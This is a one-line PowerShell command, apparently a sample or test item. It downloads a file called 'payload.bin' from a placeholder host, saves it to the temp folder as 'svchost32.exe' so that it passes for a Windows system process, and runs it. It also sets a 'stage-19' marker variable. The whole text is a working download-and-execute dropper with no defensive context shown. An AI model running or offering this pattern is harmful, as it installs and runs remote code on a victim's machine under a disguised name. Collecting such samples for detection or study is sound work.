(New-Object System.Net.WebClient).DownloadFile("https://example.com:443/downloads/payload.bin", "$env:TEMP\svchost32.exe"); & "$env:TEMP\svchost32.exe"; $StageMarker = "stage-19"
